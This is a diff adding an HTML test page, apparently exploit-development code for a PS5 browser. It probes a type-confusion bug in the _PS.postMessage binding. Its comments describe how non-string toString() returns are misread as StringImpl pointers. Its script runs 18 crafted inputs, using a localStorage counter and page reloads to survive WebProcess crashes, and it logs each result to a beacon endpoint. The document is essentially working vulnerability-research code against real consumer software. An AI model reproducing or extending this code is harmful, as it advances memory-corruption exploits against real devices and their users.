@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v10b</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+
+var KEY='p844v10b_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+
+var testNum=getTest();
+log('P844v10b BOOT test='+testNum);
+bn('P844v10b-BOOT','test='+testNum);
+
+// _PS.postMessage type confusion exploit discovery:
+// When toString() returns a non-primitive, Sony's binding does jsCast<JSString*>(result)
+// which reads offset +0x08 (butterfly) as StringImpl* pointer.
+// JSString layout: +0x00=JSCell(8B), +0x08=m_value(StringImpl*)
+// If butterfly→StringImpl.m_length=0 → empty string → no crash!
+// For double arrays: butterfly[0]=0.0=0x0000000000000000 → m_length(hi32)=0 → SHOULD WORK
+
+var pm=_PS.postMessage;
+
+var TESTS=[
+  // T0: SAFE BASELINE — real string (must succeed)
+  function T0(){
+    var r;
+    try{r=pm.call(_PS,{toString:function(){return 'safe_baseline';}});}catch(e){r='err:'+e.message;}
+    return 'baseline='+String(r);
+  },
+  // T1: Array with ALL 0.0 elements (double mode)
+  // butterfly[0]=0.0 → m_refCount=0, m_length=0 → empty string → NO CRASH?
+  function T1(){
+    var arr=[];
+    for(var i=0;i<50;i++)arr.push(0.0);
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return arr;}});}catch(e){r='err:'+e.message;}
+    return 'arr_0.0='+String(r);
+  },
+  // T2: Array with ONE element = 0.0
+  function T2(){
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return [0.0];}});}catch(e){r='err:'+e.message;}
+    return 'arr1='+String(r);
+  },
+  // T3: Array with NaN elements (NaN = 0x7FF8000000000000)
+  // m_length = hi32 of NaN = 0x7FF80000 = 2146959360 → huge but maybe safe if characters ptr is valid?
+  function T3(){
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return [NaN];}});}catch(e){r='err:'+e.message;}
+    return 'arr_nan='+String(r);
+  },
+  // T4: Array with Infinity (0x7FF0000000000000)
+  // m_length = 0x7FF00000 → huge → likely crash
+  function T4(){
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return [Infinity];}});}catch(e){r='err:'+e.message;}
+    return 'arr_inf='+String(r);
+  },
+  // T5: Array with -0 (0x8000000000000000)
+  // m_length = 0x80000000 = 2147483648 → huge → crash
+  function T5(){
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return [-0];}});}catch(e){r='err:'+e.message;}
+    return 'arr_nz='+String(r);
+  },
+  // T6: Dense array with elements 0-49 as integers
+  // NaN-boxed int 0 = 0xFFFF000000000000 → m_length=0xFFFF0000 → crash
+  function T6(){
+    var arr=[];for(var i=0;i<50;i++)arr.push(i);
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return arr;}});}catch(e){r='err:'+e.message;}
+    return 'arr_int='+String(r);
+  },
+  // T7: Holey array (first element is hole = undefined)
+  // In JSC, holes are 0x0a (special empty value) — might have m_length=0 in hi32
+  function T7(){
+    var arr=new Array(10); // holey, all elements are holes
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return arr;}});}catch(e){r='err:'+e.message;}
+    return 'arr_holey='+String(r);
+  },
+  // T8: Object with 100 properties (force butterfly, butterfly[-1] = last prop)
+  // butterfly[0] is past the property storage → might be unmapped → crash
+  function T8(){
+    var obj={};for(var i=0;i<100;i++)obj['p'+i]=0;
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return obj;}});}catch(e){r='err:'+e.message;}
+    return 'obj100='+String(r);
+  },
+  // T9: Object AND array elements (both sides of butterfly populated)
+  // butterfly[0] = first array element = 0.0
+  function T9(){
+    var obj={};
+    obj[0]=0.0;obj[1]=0.0;obj[2]=0.0; // indexed properties → right side of butterfly
+    obj.a=0;obj.b=0; // named properties → left side
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return obj;}});}catch(e){r='err:'+e.message;}
+    return 'obj_both='+String(r);
+  },
+  // T10: DataView wrapping controlled AB
+  function T10(){
+    var ab=new ArrayBuffer(64);
+    // Leave all zeros → if butterfly is at +0x08, it needs to be non-null
+    var dv=new DataView(ab);
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return dv;}});}catch(e){r='err:'+e.message;}
+    return 'dv='+String(r);
+  },
+  // T11: Uint8Array (TypedArray — +0x08 is butterfly, +0x10 is m_vector)
+  function T11(){
+    var ta=new Uint8Array(64);
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return ta;}});}catch(e){r='err:'+e.message;}
+    return 'u8='+String(r);
+  },
+  // T12: Uint8Array WITH named property (force butterfly allocation)
+  function T12(){
+    var ta=new Uint8Array(64);
+    ta.myProp=1; // force butterfly
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return ta;}});}catch(e){r='err:'+e.message;}
+    return 'u8_prop='+String(r);
+  },
+  // T13: new String("hello") — JSStringObject with internalValue at +0x10
+  function T13(){
+    var so=new String("test string here");
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return so;}});}catch(e){r='err:'+e.message;}
+    return 'strObj='+String(r);
+  },
+  // T14: RegExp (has compiled code internally)
+  function T14(){
+    var re=/test/gi;
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return re;}});}catch(e){r='err:'+e.message;}
+    return 'regex='+String(r);
+  },
+  // T15: Empty array [] — might have butterfly=null (no elements allocated)
+  function T15(){
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return [];}});}catch(e){r='err:'+e.message;}
+    return 'arr_empty='+String(r);
+  },
+  // T16: Array-like with length property but no real butterfly
+  function T16(){
+    var o={length:0,0:0.0};
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return o;}});}catch(e){r='err:'+e.message;}
+    return 'arrlike='+String(r);
+  },
+  // T17: Arguments object
+  function T17(){
+    var args=(function(){return arguments;})(0.0,0.0,0.0);
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return args;}});}catch(e){r='err:'+e.message;}
+    return 'arguments='+String(r);
+  }
+];
+
+var NAMES=['T0-baseline','T1-arr50zero','T2-arr1zero','T3-arrNaN','T4-arrInf',
+  'T5-arrNegZero','T6-arrInt','T7-arrHoley','T8-obj100','T9-objBoth',
+  'T10-dataview','T11-u8arr','T12-u8prop','T13-strObj','T14-regex',
+  'T15-arrEmpty','T16-arrLike','T17-arguments'];
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v10b-DONE','all='+TESTS.length);
+    clearTest();
+    return;
+  }
+  var name=NAMES[testNum]||('T'+testNum);
+  log('Running '+name+'...');
+  // PRE-ADVANCE: set next test BEFORE running current one
+  // If this test crashes WebProcess, reload starts next test
+  setTest(testNum+1);
+  bn('P844v10b-'+name+'-PRE','starting');
+  try{
+    var result=TESTS[testNum]();
+    // If we get here, test SURVIVED (no crash)
+    log(name+': '+result);
+    bn('P844v10b-'+name+'-OK',String(result).substring(0,900));
+  }catch(e){
+    log(name+' EXCEPTION: '+e.message);
+    bn('P844v10b-'+name+'-ERR',e.message);
+  }
+  // Reload to run next test (clean state per test)
+  setTimeout(function(){location.reload();},100);
+}
+
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
